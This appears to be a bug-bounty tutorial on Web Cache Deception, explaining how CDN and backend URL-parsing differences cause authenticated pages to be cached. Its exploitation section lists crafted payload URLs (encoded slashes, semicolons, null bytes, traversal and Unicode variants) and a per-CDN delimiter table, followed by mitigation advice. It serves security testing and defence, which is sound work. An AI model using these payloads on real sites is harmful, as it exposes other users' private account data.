---
title: Web Cache Deception Testing
date: 2026-07-16
categories: [Web Security, Bug Bounty]
tags:
  [
    Web-Cache-Deception,
    CDN,
    Cache-Poisoning,
    Cloudflare,
    Akamai,
    Varnish,
    Bug-Bounty,
  ]
---

---

# Introduction

Web Cache Deception (WCD) is a vulnerability that occurs when a caching layer stores sensitive, user-specific content and later serves it to unauthenticated users.

The attack typically exploits discrepancies between how a CDN or reverse proxy interprets a URL and how the backend application processes the same request.

Because modern applications rely heavily on CDNs such as Cloudflare, Akamai, Fastly, CloudFront, and Varnish, Web Cache Deception remains a valuable bug bounty attack vector capable of exposing:

- User profiles
- Billing information
- API responses
- Authentication tokens
- Internal application data

---

# Vulnerability Overview

A Web Cache Deception vulnerability occurs when:

1. A CDN identifies a request as cacheable.
2. The backend treats the request as a dynamic authenticated endpoint.
3. Sensitive content becomes stored in the cache.
4. Unauthenticated users retrieve the cached response.

### Typical Scenario

```text
CDN Sees:
    /account/style.css
            ↓
Looks Like Static Content
            ↓
Caches Response

Backend Sees:
    /account
            ↓
Returns Authenticated User Data
            ↓
Sensitive Content Cached
```

The result is an information disclosure vulnerability that may affect all authenticated users.

---

# How It Works

Web Cache Deception relies on parser inconsistencies between:

- CDN
- Reverse Proxy
- Load Balancer
- Web Application

### Example Request

```http
GET /account%2Fstyle.css HTTP/1.1
Host: target.com
Cookie: session=VALID_SESSION
```

### CDN Interpretation

```text
/account/style.css
```

Looks like a static CSS file and is therefore cacheable.

### Backend Interpretation

```text
/account
```

Returns sensitive account information.

### Result

The authenticated response becomes cached and later accessible to unauthenticated users.

---

# Root Cause

The vulnerability usually stems from one or more of the following issues:

- CDN caching based on file extension
- URL parsing inconsistencies
- Improper cache key construction
- Missing `Vary: Cookie` header
- Missing `Vary: Authorization` header
- Ignoring authentication state during caching
- Incorrect cache-control implementation
- Reverse proxy normalization differences

---

# Real World Example

Consider an application where:

```text
/account
```

returns:

```json
{
  "username": "victim",
  "email": "victim@example.com",
  "subscription": "premium"
}
```

An attacker requests:

```http
GET /account%2Fstyle.css
```

The CDN interprets the URL as a cacheable CSS resource while the backend still returns the authenticated account page.

After caching occurs:

```http
GET /account%2Fstyle.css
```

from an unauthenticated browser may expose the victim's profile data.

---

# Discovery Methodology

## The Golden Rule

Every Web Cache Deception finding should be validated using the following sequence:

```text
Authenticated MISS
        ↓
Authenticated HIT
        ↓
Unauthenticated HIT
```

If the final response contains sensitive information, the vulnerability is confirmed.

---

## Step 1 – Identify Sensitive Endpoints

Focus on endpoints that return user-specific information.

Examples:

```text
/account
/profile
/settings
/dashboard
/billing
/orders
/api/v1/me
/api/user
/api/profile
```

Look for:

- Usernames
- Email addresses
- Session identifiers
- Personal information
- API keys
- Account balances

---

## Step 2 – Detect Caching Infrastructure

Inspect response headers.

### Common Indicators

```http
X-Cache
Age
CF-Cache-Status
X-Varnish
Via
Server
```

### Example

```http
CF-Cache-Status: HIT
Age: 456
```

### Common CDN Vendors

| CDN               | Indicators      |
| ----------------- | --------------- |
| Cloudflare        | CF-Cache-Status |
| Akamai            | X-Cache         |
| Fastly            | X-Served-By     |
| CloudFront        | X-Cache         |
| Varnish           | X-Varnish       |
| Nginx Proxy Cache | X-Cache         |

---

## Step 3 – Verify Cache Behavior

Determine whether cache directives are respected.

### Important Headers

```http
Cache-Control: private
Cache-Control: no-store
Cache-Control: no-cache
```

A vulnerable CDN may cache content despite these directives.

### Cache Buster

Always append a unique value:

```text
?cb=12345
```

This prevents interference from previous tests.

---

# Exploitation

## Delimiter Testing

The goal is to trick the CDN into identifying a request as static content while the backend still processes the original endpoint.

### Encoded Slash

```http
/account%2Fstyle.css
```

### Encoded Dot

```http
/account%2estyle.css
```

### Semicolon

```http
/account;style.css
```

### Double Slash

```http
/account//style.css
```

### Backslash

```http
/account\style.css
```

### Encoded Backslash

```http
/account%5Cstyle.css
```

### Null Byte

```http
/account%00.css
```

### Path Traversal Variation

```http
/account/..%2Fstyle.css
```

### Unicode Slash

```http
/account%EF%BC%8Fstyle.css
```

---

## Extension Testing

Once a working delimiter is found, test common cacheable extensions.

```text
.css
.js
.png
.jpg
.svg
.ico
.woff
.woff2
.json
.xml
```

### Examples

```http
/account%2Fstyle.css
/account%2Fmain.js
/account%2Fimage.png
/account%2Fdata.json
```

---

## Static Directory Targeting

Many CDNs aggressively cache static directories.

### Examples

```text
/static/
/assets/
/media/
/public/
```

### Test Cases

```http
/static/account%2Fstyle.css
/assets/profile%2Fmain.js
/public/dashboard%2Fimage.png
```

---

## API Endpoint Confusion

Some CDNs cache URLs based solely on their extension.

### Examples

```http
/api/v1/me.json
/api/user.js
/api/profile.css
```

If the backend ignores the extension, sensitive data may become cacheable.

---

## Fat GET Requests

Certain applications process request bodies in GET requests.

### Example

```http
GET /api/user HTTP/1.1

{
  "id":"123"
}
```

Some caches ignore request bodies entirely, causing unexpected behavior.

---

## Trailing Slash Variations

Test both forms:

```text
/account
/account/
```

Normalization differences occasionally create separate cache entries.

---

## Method Confusion

Test:

```http
GET
POST
HEAD
OPTIONS
```

Some caching layers treat methods differently from backend applications.

---

## Cache Key Analysis

Understanding cache key construction is critical.

### Check Vary Header

```http
Vary: Cookie
```

```http
Vary: Authorization
```

If absent, authentication state may not be part of the cache key.

---

## Authorization Testing

Compare responses:

### Request 1

```http
Authorization: Bearer VALIDTOKEN
```

### Request 2

```http
(no Authorization header)
```

If identical content is returned from cache, authentication may not be considered.

---

## Param Miner

Burp's Param Miner extension is extremely effective for discovering:

- Unkeyed parameters
- Hidden inputs
- Cache key discrepancies

Useful for identifying cache poisoning and cache deception opportunities.

---

# Confirming The Vulnerability

For every potential payload, perform the complete three-request sequence.

### Request 1 – Authenticated MISS

```text
Authenticated User
Fresh Cache Buster
X-Cache: MISS
```

Response should contain sensitive information.

---

### Request 2 – Authenticated HIT

```text
Authenticated User
Same URL
X-Cache: HIT
```

Confirms the response is cached.

---

### Request 3 – Unauthenticated HIT

```text
No Cookies
Incognito Browser
X-Cache: HIT
```

If sensitive information remains visible:

```text
VULNERABILITY CONFIRMED
```

---

# Impact

Successful exploitation may expose:

- Personal information
- Billing records
- Internal APIs
- Session data
- Account details
- Customer information

Potential consequences include:

- Information Disclosure
- Privacy Violations
- Regulatory Exposure
- Account Takeover Support
- Business Data Leakage

Severity is typically Medium to High, depending on the sensitivity of exposed content.

---

# Mitigation

Organizations should implement multiple layers of protection.

### Disable Caching For Sensitive Content

```http
Cache-Control: no-store
```

```http
Cache-Control: private
```

---

### Include Authentication In Cache Keys

Ensure caching varies on:

```http
Cookie
Authorization
```

---

### Normalize URLs Consistently

CDN and backend systems should process URLs identically.

---

### Restrict Static File Caching Rules

Avoid relying solely on file extensions.

### Weak

```text
*.css
*.js
*.png
```

### Better

```text
/static/*
/assets/*
```

---

### Audit CDN Configuration

Review:

- Cache rules
- Origin rules
- Rewrite logic
- Path normalization
- Header handling

---

# Tooling

| Tool                | Purpose                 |
| ------------------- | ----------------------- |
| Burp Suite Repeater | Manual testing          |
| Param Miner         | Cache key analysis      |
| ffuf                | Delimiter fuzzing       |
| curl                | Quick validation        |
| wcvs                | Automated cache testing |
| Burp Logger++       | Header tracking         |

---

# Report Evidence

A high-quality report should include:

### Cache Evidence

```http
X-Cache: HIT
```

or

```http
CF-Cache-Status: HIT
```

### Sensitive Data

Evidence showing authenticated content in the cached response.

### Reproduction

- Different browser
- Different IP address
- Incognito session

### Payload

Document the exact:

```text
Delimiter
Extension
Endpoint
```

that caused the cache deception.

### Proof of Concept

Always include:

```text
MISS
↓
HIT
↓
Unauthenticated HIT
```

sequence in the report.

---

# CDN-Specific Notes

| CDN               | Commonly Effective Delimiters |
| ----------------- | ----------------------------- |
| Cloudflare        | `%2F`, `%2e`, `?`             |
| Akamai            | `;`, `%2F`, `%09`             |
| Nginx Proxy Cache | `%2F`, `//`, `%00`            |
| Varnish           | `.css`, `.js`, `?`            |
| CloudFront        | `?`, `%2F`, `%00`             |
| Fastly            | `;`, `%2F`                    |

Results vary depending on cache configuration and URL normalization settings.

---

# References

- OWASP Web Security Testing Guide
- PortSwigger Web Security Academy – Web Cache Deception
- PortSwigger Research – Practical Web Cache Poisoning
- RFC 7234 HTTP Caching
- Cloudflare Cache Documentation
- Fastly Cache Documentation
- Akamai Caching Best Practices

---

# Key Takeaways

- Web Cache Deception exploits differences between CDN and backend URL parsing.
- The most reliable validation method is the three-request sequence: MISS → HIT → Unauthenticated HIT.
- Delimiter fuzzing remains the primary discovery technique.
- Cache key analysis is often more important than payload generation.
- Authentication data should never be stored in shared caches.
- Proper cache-control directives alone are not sufficient unless enforced by the CDN.
- Every sensitive endpoint should be tested for cache behavior during security assessments.
